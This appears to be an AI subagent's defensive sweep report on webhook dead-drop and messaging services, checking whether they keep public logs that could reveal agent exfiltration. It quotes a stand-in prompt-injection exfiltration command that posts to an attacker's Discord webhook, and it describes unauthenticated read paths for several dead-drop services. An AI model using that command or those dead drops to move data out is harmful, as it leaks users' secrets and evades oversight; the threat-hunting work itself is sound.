# Dead-drop + messaging services sweep — 2026-10-04

**Lane:** dead-drops + messaging only (webhook dead-drops: pipedream, requestbin.net/requestcatcher, beeceptor, mocky, jsonblob, zuplo mockbin; ntfy.sh; Gotify; telegra.ph; Discord). webhook.site covered by the sibling lane — not re-done.
**Task:** for each service: does it keep a PUBLIC searchable/logged record? Queryable without an account? Look for agent/swarm behavior (burst patterns, structured exfil payloads, harness-generated names). Document undocumented XHR/fetch endpoints.
**Method:** per-service curl probes of homepage + API surface + JS bundles (via VM egress proxy; note infra blockers below), page-source/API inspection for undocumented endpoints, `site:` web searches, marker greps across the urlquery corpora.
**Sweeper:** subagent (depth 2), 2026-10-04 ~22:50–23:30 CDT.

## Verdict: NO new agent/swarm hits on any service. One live lead + one new agent-native dead-drop service documented.

No public logs, burst patterns, or agent-shaped dead-drop contents found. The known operator context (Chinese Amap-map data-collection fleet, webhook.site dead-drops + jina-proxy image beacons, Jan–Oct 2026) has zero footprint on any service in this lane. Marker greps across all available corpora return **zero** for every trick-class marker: ntfy, jsonblob, mocky, pipedream, beeceptor, requestbin, requestcatcher, telegra.ph, discord webhook URLs, gotify — vs 3,695 httpbun hits and 15,174 httpbun hits in the same corpora (known corpus tradecraft), so the greps are not broken; the absence is real.

**Lead (not a hit):** `ntfy.sh/friendlyAgents` — a PUBLIC default ntfy topic where the `friendlyagents`/`agent-deck` Claude-Code tooling publishes structured agent status messages (`{"session":"test-agent-001","msg":"..."}`). Unverifiable from this VM (ntfy.sh is blackholed by runtime policy, see below) — needs a poll from an unblocked network. Poll path: `https://ntfy.sh/friendlyAgents/json?poll=1`.

**New surface for the inventory:** `stash.legible.sh` — an agent-native dead-drop ("topic-addressed artifact mailbox", soft-launched ~Jul 2026, legible-sh/stash on GitHub): PUT/GET/DELETE files by topic name, `GET /{topic}` lists, SSE watch, 24h default TTL (7d max), 25 MB/file, sha256 in responses, topics `[a-zA-Z0-9_-]{1,64}`, no auth, unguessable=private, NO enumeration endpoint. Zero corpus hits today.

---

## Marker greps (all corpora)

| Corpus | ntfy | jsonblob | mocky | pipedream | beeceptor | requestbin | requestcatcher | telegra.ph | discord api/webhooks | gotify | stash.legible |
|---|---|---|---|---|---|---|---|---|---|---|---|
| urlquery unified corpus `~/workspace/urlquery-api-hunt/artifacts/dataset/unified_reports.jsonl` (36M) | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
| oai-tag-sweep `data/2026-10-01-oai-tag-sweep/events.jsonl` (54M) | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | n/a | 0 | 0 |
| marker-sweep raw `data/2025-12-04-urlquery-marker-sweep/raw/` | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | n/a |
| openai-agent-traces `traces.jsonl` / `urlscan.jsonl` / `commoncrawl.jsonl` / `linkage.jsonl` | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | n/a | 0 | 0 |

Sanity: `httpbun` returns 3,695 / 15,174 in the same files, so the zero counts are genuine absences, not grep failures.

## Pipedream / RequestBin

- `pipedream.com/requestbin` → **301 → /** (homepage: "Pipedream — The integration layer for AI agents"). The original no-signup RequestBin (`requestb.in`, `requestbin.com`) is gone; "Create Request Bin" now routes to `/auth/signup`. Account-gated: no public workflow list, no public execution history, no unauthenticated request inspection. **Clean negative** for public logs.
- Pipedream's HTTP workflow endpoints live at `*.m.pipedream.net` and are per-account secrets — not enumerable.
- `requestbin.net` (separate, currently operating product per 2026 press): homepage loads (200), signup/onboard gated (`/onboard`, `/sign-up` in page source), free tier 3 bins / 500 req/day, ships an MCP server "so tools like Claude Code or Cursor can drive it programmatically". Bins are account-scoped; no public bin index found. **Clean negative** for public logs; MCP surface noted as agent-relevant infrastructure.

## requestcatcher.com

- Homepage (200): "Request Catcher will create a subdomain on which you can test an application. All requests sent to any path on the subdomain are forwarded to your browser in real time." Assets: `assets/root.e985466a.js` (1.4 KB stub — page requires subdomain context).
- Model: `<sub>.requestcatcher.com` — a visitor to that URL sees the live request log (no auth), so contents are public-by-subdomain but there is **no index, no search, no enumeration** of subdomains. Requests are pushed in real time; persistence unclear. **Clean negative** for searchable logs; unguessable-subdomain model.

## Beeceptor

- Homepage (200): account-gated mock endpoints (`<name>.beeceptor.com` per user); traffic logs behind login. No public request-log endpoint, no enumeration. `api.beeceptor.com` → 404 on root probe. **Clean negative.**

## Mocky

- `mocky.io`, `www.mocky.io`, `run.mocky.io`, `design.mocky.io` → all 000 through the VM egress proxy (proxy aborts; could not load). Known model from docs/search: mocky creates **shareable mock URLs with predefined responses** (`run.mocky.io/v3/<uuid>` style); there is no incoming-request log at all — it is a response-mocker, not a dead-drop. The shareable mock URL itself is public-by-uuid if leaked. **Negative for logs by construction** (nothing to log); note the egress block prevented a fresh live probe.

## jsonblob.com

- Homepage (200): no recent/browse/search/public-index links anywhere in the markup — blobs are client-local "recent" only.
- Verified public read path: `GET https://jsonblob.com/api/jsonBlob/00000000-0000-0000-0000-000000000000` → 404 `{"error":"Blob not found"}` — i.e. the endpoint is live and **public-by-uuid read**: `GET /api/jsonBlob/{uuid}` returns any blob with no auth (documented public API: `POST /api/jsonBlob` creates).
- Live `POST /api/jsonBlob` from this VM → upstream **403 Forbidden** (jsonblob rejects the egress-proxy path / non-browser agent), so the create path could not be exercised here; read path confirmed. **No enumeration endpoint found**; no public listing. Clean negative for searchable logs.

## ntfy.sh

- **Environment blocker:** ntfy.sh is unreachable from this VM by design — egress proxy aborts `CONNECT ntfy.sh:443`, and the text-fetch tool refuses it under policy `ir_blackhole_ntfy_sh`. No direct probe was possible; findings below are from docs + web search.
- Protocol facts: topics are **public to anyone who knows the name**; there is **no topic list/search/enumeration API**; obscurity is the only protection on the public server. Known-public topics: `https://ntfy.sh/stats` (server stats), `https://ntfy.sh/announcements`.
- **LEAD — `ntfy.sh/friendlyAgents`:** the `friendlyagents` tool (github.com/valenvivaldi/friendlyagents; "notis — Agent Chat Viewer") installs a Claude Code SessionStart hook that publishes structured agent messages to the **public default topic `friendlyAgents`**: `curl -d '{"session":"test-agent-001","msg":"Hello! Starting work on the feature."}' https://ntfy.sh/friendlyAgents`. Any Claude session running that installer speaks on that topic — agent-shaped, structured-payload, publicly readable. **Follow-up from an unblocked network:** poll `https://ntfy.sh/friendlyAgents/json?poll=1` (and `?since=all`) for bursts, session-id grammars, and agent-model fingerprints. Same applies to the `agent-deck` watcher ecosystem (docs explicitly warn ntfy topics leak into public configs — more leaked public topics likely exist in GitHub code search).
- Related: `stash.legible.sh` (see new-surface note above) markets itself as "ntfy's pattern applied to bytes".

## Gotify

- No public instance exists (self-hosted only; confirmed via project docs and a 2026 recipe audit: "self-hosted with no public instance"). Auth is mandatory (admin login, app tokens); no topic registry, no enumeration. **Clean negative** — blind spot is only misconfigured private instances, which are not a public surface.

## telegra.ph

- No native search; `getPageList` requires a per-account access token. Third-party search engines exist (Telegrack/Telecrack) and Google indexes pages (`site:telegra.ph` works — confirmed by an indexed SEO-spam page).
- Verified: page fetch `https://telegra.ph/Google-Index-Tool-Bulk-Urls-Pages--Web-Site-Indexing-01-25` → 200, 59 KB article, no auth. Pages are public-by-path; the `api.telegra.ph` host is proxy-blocked from this VM but the documented public read endpoint is `GET https://api.telegra.ph/getPage/{path}?return_content=true`.
- `site:telegra.ph webhook exfil agent prompt harness tutorial` → 0 results. No agent writeups / dead-drop content found via search. **Clean negative.**

## Discord

- **No public webhook-message log service exists.** Webhook URLs are `https://discord.com/api/webhooks/{id}/{token}` — the token IS the credential; content is only visible inside the channel. Discord message URLs are not meaningfully indexed by search engines.
- Context: agent-security literature treats Discord webhooks as a known exfil channel (MITRE T1567.004): rip-cage egress-firewall design cites `curl -X POST https://discord.com/api/webhooks/<attacker>` as the canonical prompt-injection exfil; hazmat lists `discord.com/api/webhooks` as C2/exfil; gitleaks rules flag leaked webhook URLs. This is why the lane was checked — but there is no public surface to farm. **Clean negative**; detection would require leaked `{id}/{token}` pairs in code (gitleaks/vibeguard-style), which is a code-search lane, not a service lane.

## Zuplo Mockbin (bonus, found during mocky probing)

- `mockbin.io` (200): Zuplo's free "mock an API endpoint and track requests to it". "Recent bins" is **browser localStorage**, not a server listing; no `/api/` endpoints in page source; no public bin index. Private-by-uuid model. **Clean negative.**

## Undocumented endpoints found

- `GET https://jsonblob.com/api/jsonBlob/{uuid}` — public unauthenticated blob read (returns 404 `{"error":"Blob not found"}` for unknown ids). No listing endpoint.
- `GET https://api.telegra.ph/getPage/{path}?return_content=true` — public unauthenticated page read (documented API; verified the path model by fetching a telegra.ph page directly, 200/59KB).
- `GET https://stash.legible.sh/{topic}` — public topic file listing; `PUT /{topic}/{file}`, `GET /{topic}/{file}`, `DELETE /{topic}/{file}`, SSE `Accept: text/event-stream` watch; `GET /README.md`, `GET /llms.txt` carry the full contract. No auth, no enumeration.
- ntfy streaming JSON: `https://ntfy.sh/{topic}/json?poll=1` (+ `?since=all`) — the documented public read path; UNVERIFIED from this VM (policy blackhole) — re-verify from an unblocked network before asserting it in public writeups.
- Negative API probes: beeceptor root API → 404; requestcatcher JS is a subdomain-context stub with no API surface in the bundle; Pipedream `/requestbin` → 301 to homepage.

## Infrastructure notes (for future sweeps from this VM)

- Egress proxy aborts CONNECT for: `ntfy.sh`, `api.telegra.ph`, all `mocky.io` hosts (transient for beeceptor.com — retried to 200). text-fetch tool hard-denies ntfy.sh (`ir_blackhole_ntfy_sh`). Plan ntfy/telegraph-API verification from an unblocked network.
- jsonblob.com `POST /api/jsonBlob` → upstream 403 via the proxy; GETs fine. jsonblob blocks the proxy path for writes.

## Not pushed (per brief). File written; awaiting orchestrator merge.
